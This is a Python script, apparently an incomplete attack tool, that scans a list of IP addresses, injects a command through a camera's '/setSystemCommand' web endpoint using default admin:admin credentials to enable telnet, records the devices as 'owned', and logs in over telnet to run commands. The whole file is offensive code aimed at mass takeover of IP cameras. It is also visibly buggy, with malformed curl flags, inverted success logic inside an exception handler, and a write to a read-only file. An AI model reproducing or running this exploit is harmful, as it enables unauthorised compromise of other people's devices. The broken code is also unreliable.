import os
import ipaddress
import shlex
import subprocess
import telnetlib


# TODO: change this to include IP + correct creds
def curlInjection(ip):
    cmd = "curl 'http://" + ip + "/setSystemCommand' " \
                                 "--user admin:admin " \
                                 "- H 'Authorization: Basic $BASICAUTH_CREDS' " \
                                 "- H 'Content-Type: application/x-www-form-urlencoded' - " \
                                 "-data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm" \
                                 "&SystemCommand=telnetd&ConfigSystemCommand=Save'"
    os.system(cmd)


if __name__ == '__main__':
    ipLog = open('ipList.txt')
    ownedDevice = open('theMemesOfProduction.txt')
    for x in ipLog:
        currIP = ipaddress.ip_address(x)
        cmd = shlex.split("ping " + x)
        # ping the IP address
        try:
            output = subprocess.check_output(cmd)
        except:
            # If ping does not reach given IP skip the IP
            if subprocess.CalledProcessError:
                # Will print the command failed with its exit status
                print("The IP {0} is Not Reachable".format(cmd[-1]))
                pass
            # If it can reach the IP address, then we can continue the attack
            else:
                print("The IP {0} is Reachable".format(cmd[-1]))
                # Telnet injection stuff here
                curlInjection(x)
                # save IP address to a file of owned devices
                ownedDevice.write(x + '\n')
                # Camera's IP address
                HOST = x
                # brute force your way maybe?
                user = 'admin'
                password = 'admin'

                PORT = 23
                # Connect to Camera's IP through telnet server using username and password
                tn = telnetlib.Telnet(HOST, PORT)
                tn.read_until("login: ")
                tn.write(user + "\r\n")
                tn.read_until("password: ")
                tn.write(password + "\r\n")
                # TODO: need to do stuff based on if we have the right one
                # run uname to determine if we have the right camera
                tn.write("uname -a \r\n")
                ret1 = tn.read_eager()